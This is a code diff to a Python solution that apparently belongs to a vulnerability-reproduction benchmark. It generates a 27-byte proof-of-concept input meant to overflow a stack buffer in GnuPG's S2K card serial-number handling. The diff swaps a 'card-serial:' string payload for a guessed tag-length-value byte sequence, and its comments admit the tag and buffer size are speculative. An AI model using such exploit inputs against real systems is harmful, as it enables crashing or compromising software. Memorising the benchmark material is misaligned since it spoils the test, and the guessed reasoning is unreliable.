@@ -1,3 +1,6 @@
+import os
+import sys
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
@@ -9,28 +12,20 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
+        # The vulnerability is a stack buffer overflow when processing an overly long
+        # GPG S2K card serial number. The ground-truth PoC length of 27 bytes
+        # strongly suggests a Tag-Length-Value (TLV) structure.
+        #
+        # A 1-byte tag, 1-byte length, and 25-byte value/payload sum to 27 bytes.
+        # This payload size would overflow a 24-byte stack buffer by one byte.
+        #
+        # - Tag: Based on GnuPG source code conventions, 0xC4 is a plausible tag
+        #   for a card serial number object.
+        # - Length: The payload length is 25, which is 0x19 in hexadecimal.
+        # - Value: A sequence of 25 'A's serves as the payload to cause the overflow.
         
-        # The vulnerability is described as related to "excessively long GPG S2K card serial numbers".
-        # In GnuPG, a smart card can be identified using the "card-serial:SERIALNUMBER" syntax.
-        # This is a plausible entry point for the vulnerability.
-        # A stack buffer overflow would occur if the provided SERIALNUMBER is copied into
-        # a fixed-size buffer without proper length validation.
-
-        # The ground-truth PoC length is 27 bytes.
-        # The prefix "card-serial:" is 12 bytes long.
-        prefix = b'card-serial:'
+        tag = b'\xc4'
+        length = b'\x19'
+        payload = b'A' * 25
         
-        # To match the total length of 27 bytes, the payload (the serial number)
-        # must be 27 - 12 = 15 bytes long.
-        payload_length = 27 - len(prefix)
-        
-        # A simple payload of repeated characters is sufficient to cause an overflow.
-        payload = b'A' * payload_length
-        
-        # This PoC implies a vulnerability where a buffer of size 15 is allocated
-        # for the serial number. A standard string copy function would write the
-        # 15 payload bytes plus a null terminator, resulting in a 16-byte write
-        # and a one-byte buffer overflow, which is a common vulnerability pattern.
-        poc = prefix + payload
-        
-        return poc
+        return tag + length + payload
